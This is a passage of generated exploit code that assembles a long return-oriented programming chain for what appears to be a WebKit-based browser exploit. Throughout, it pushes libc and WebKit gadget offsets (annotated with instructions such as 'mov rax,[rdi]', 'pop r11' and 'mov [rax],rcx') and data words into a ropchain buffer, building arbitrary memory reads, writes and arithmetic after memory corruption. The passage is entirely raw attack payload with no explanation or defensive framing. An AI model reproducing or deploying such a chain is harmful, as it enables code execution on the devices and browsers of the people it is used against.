libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+92568,//L677
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+92536,//L675
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+92552,//L676
webkit_base+4687784,
libc_base+165442
]);
//L675:
db([0,0]);
set_gadget(libc_base+772328,);
//L676:
db([0,0]);
set_gadget(libc_base+768796,);
//L677:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+92640,//L679
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L679:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+92696,//L681
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L681:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+92792,//L683
webkit_base+4687784,
libc_base+768796
]);
//L682:
db([8,0]);// 0x8
set_gadget(webkit_base+3789839,);//pop r11
//L683:
db([0,0]);
set_gadget(libc_base+772328,);
//L684:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+92888,//L685
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+92904,//L686
webkit_base+4687784,
libc_base+772328
]);
//L685:
db([0,0]);
set_gadget(libc_base+768796,);
//L686:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+92992,//L688
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L688:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+93048,//L690
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L690:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+93120,//L692
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L692:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+93176,//L694
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L694:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L695:
libc_base+768796,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+93328,//L698
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L696:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L698:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+93416,//L700
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+93432,//L701
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L700:
db([0,0]);
set_gadget(libc_base+772328,);
//L701:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+93576,//L704
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+93544,//L702
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+93560,//L703
webkit_base+4687784,
libc_base+165442
]);
//L702:
db([0,0]);
set_gadget(libc_base+772328,);
//L703:
db([0,0]);
set_gadget(libc_base+768796,);
//L704:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+93648,//L706
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L706:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+93704,//L708
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L708:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+93800,//L710
webkit_base+4687784,
libc_base+768796
]);
//L709:
db([9,0]);// 0x9
set_gadget(webkit_base+3789839,);//pop r11
//L710:
db([0,0]);
set_gadget(libc_base+772328,);
//L711:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+93896,//L712
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+93912,//L713
webkit_base+4687784,
libc_base+772328
]);
//L712:
db([0,0]);
set_gadget(libc_base+768796,);
//L713:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+94000,//L715
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L715:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+94056,//L717
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L717:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+94128,//L719
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L719:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+94184,//L721
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L721:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+94288,//L724
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L722:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L724:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+94376,//L726
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+94392,//L727
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L726:
db([0,0]);
set_gadget(libc_base+772328,);
//L727:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+94536,//L730
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+94504,//L728
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+94520,//L729
webkit_base+4687784,
libc_base+165442
]);
//L728:
db([0,0]);
set_gadget(libc_base+772328,);
//L729:
db([0,0]);
set_gadget(libc_base+768796,);
//L730:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+94608,//L732
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L732:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+94664,//L734
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L734:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+94760,//L736
webkit_base+4687784,
libc_base+768796
]);
//L735:
db([6,0]);// 0x6
set_gadget(webkit_base+3789839,);//pop r11
//L736:
db([0,0]);
set_gadget(libc_base+772328,);
//L737:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+94856,//L738
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+94872,//L739
webkit_base+4687784,
libc_base+772328
]);
//L738:
db([0,0]);
set_gadget(libc_base+768796,);
//L739:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+94960,//L741
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L741:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+95016,//L743
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L743:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+95136,//L746
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L744:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L746:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+95224,//L748
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+95240,//L749
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L748:
db([0,0]);
set_gadget(libc_base+772328,);
//L749:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+95384,//L752
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+95352,//L750
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+95368,//L751
webkit_base+4687784,
libc_base+165442
]);
//L750:
db([0,0]);
set_gadget(libc_base+772328,);
//L751:
db([0,0]);
set_gadget(libc_base+768796,);
//L752:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+95456,//L754
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L754:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+95512,//L756
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L756:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+95608,//L758
webkit_base+4687784,
libc_base+768796
]);
//L757:
db([10,0]);// 0xa
set_gadget(webkit_base+3789839,);//pop r11
//L758:
db([0,0]);
set_gadget(libc_base+772328,);
//L759:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+95704,//L760
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+95720,//L761
webkit_base+4687784,
libc_base+772328
]);
//L760:
db([0,0]);
set_gadget(libc_base+768796,);
//L761:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+95808,//L763
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L763:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+95864,//L765
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L765:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+95936,//L767
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L767:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+95992,//L769
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L769:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L770:
webkit_base+14572727,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+96144,//L773
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L771:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L773:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+96232,//L775
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+96248,//L776
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L775:
db([0,0]);
set_gadget(libc_base+772328,);
//L776:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+96392,//L779
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+96360,//L777
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+96376,//L778
webkit_base+4687784,
libc_base+165442
]);
//L777:
db([0,0]);
set_gadget(libc_base+772328,);
//L778:
db([0,0]);
set_gadget(libc_base+768796,);
//L779:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+96464,//L781
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L781:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+96520,//L783
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L783:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+96616,//L785
webkit_base+4687784,
libc_base+768796
]);
//L784:
db([11,0]);// 0xb
set_gadget(webkit_base+3789839,);//pop r11
//L785:
db([0,0]);
set_gadget(libc_base+772328,);
//L786:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+96712,//L787
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+96728,//L788
webkit_base+4687784,
libc_base+772328
]);
//L787:
db([0,0]);
set_gadget(libc_base+768796,);
//L788:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+96816,//L790
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L790:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+96872,//L792
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L792:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+96944,//L794
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L794:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+97000,//L796
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L796:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L797:
libc_base+845410,//mov rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+97152,//L800
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L798:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L800:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+97240,//L802
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+97256,//L803
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L802:
db([0,0]);
set_gadget(libc_base+772328,);
//L803:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+97400,//L806
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+97368,//L804
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+97384,//L805
webkit_base+4687784,
libc_base+165442
]);
//L804:
db([0,0]);
set_gadget(libc_base+772328,);
//L805:
db([0,0]);
set_gadget(libc_base+768796,);
//L806:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+97472,//L808
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L808:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+97528,//L810
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L810:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+97624,//L812
webkit_base+4687784,
libc_base+768796
]);
//L811:
db([12,0]);// 0xc
set_gadget(webkit_base+3789839,);//pop r11
//L812:
db([0,0]);
set_gadget(libc_base+772328,);
//L813:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+97720,//L814
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+97736,//L815
webkit_base+4687784,
libc_base+772328
]);
//L814:
db([0,0]);
set_gadget(libc_base+768796,);
//L815:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+97824,//L817
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L817:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+97880,//L819
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L819:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+97952,//L821
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L821:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+98008,//L823
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L823:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L824:
libc_base+713278,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+98160,//L827
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L825:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L827:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+98248,//L829
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+98264,//L830
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L829:
db([0,0]);
set_gadget(libc_base+772328,);
//L830:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+98408,//L833
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+98376,//L831
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+98392,//L832
webkit_base+4687784,
libc_base+165442
]);
//L831:
db([0,0]);
set_gadget(libc_base+772328,);
//L832:
db([0,0]);
set_gadget(libc_base+768796,);
//L833:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+98480,//L835
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L835:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+98536,//L837
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L837:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+98632,//L839
webkit_base+4687784,
libc_base+768796
]);
//L838:
db([13,0]);// 0xd
set_gadget(webkit_base+3789839,);//pop r11
//L839:
db([0,0]);
set_gadget(libc_base+772328,);
//L840:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+98728,//L841
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+98744,//L842
webkit_base+4687784,
libc_base+772328
]);
//L841:
db([0,0]);
set_gadget(libc_base+768796,);
//L842:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+98832,//L844
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L844:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+98888,//L846
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L846:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+98960,//L848
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L848:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+99016,//L850
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L850:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+99120,//L853
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L851:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L853:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+99208,//L855
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+99224,//L856
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L855:
db([0,0]);
set_gadget(libc_base+772328,);
//L856:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+99368,//L859
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+99336,//L857
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+99352,//L858
webkit_base+4687784,
libc_base+165442
]);
//L857:
db([0,0]);
set_gadget(libc_base+772328,);
//L858:
db([0,0]);
set_gadget(libc_base+768796,);
//L859:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+99440,//L861
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L861:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+99496,//L863
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L863:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+99592,//L865
webkit_base+4687784,
libc_base+768796
]);
//L864:
db([5,0]);// 0x5
set_gadget(webkit_base+3789839,);//pop r11
//L865:
db([0,0]);
set_gadget(libc_base+772328,);
//L866:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+99688,//L867
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+99704,//L868
webkit_base+4687784,
libc_base+772328
]);
//L867:
db([0,0]);
set_gadget(libc_base+768796,);
//L868:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+99792,//L870
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L870:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+99848,//L872
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L872:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+99968,//L875
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L873:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L875:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+100056,//L877
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+100072,//L878
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L877:
db([0,0]);
set_gadget(libc_base+772328,);
//L878:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+100216,//L881
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+100184,//L879
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+100200,//L880
webkit_base+4687784,
libc_base+165442
]);
//L879:
db([0,0]);
set_gadget(libc_base+772328,);
//L880:
db([0,0]);
set_gadget(libc_base+768796,);
//L881:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+100288,//L883
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L883:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+100344,//L885
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L885:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+100440,//L887
webkit_base+4687784,
libc_base+768796
]);
//L886:
db([14,0]);// 0xe
set_gadget(webkit_base+3789839,);//pop r11
//L887:
db([0,0]);
set_gadget(libc_base+772328,);
//L888:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+100536,//L889
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+100552,//L890
webkit_base+4687784,
libc_base+772328
]);
//L889:
db([0,0]);
set_gadget(libc_base+768796,);
//L890:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+100640,//L892
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L892:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+100696,//L894
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L894:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+100768,//L896
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L896:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+100824,//L898
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L898:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
//L899:
webkit_base+4687784,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+100976,//L902
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L900:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L902:
db([0,0]);
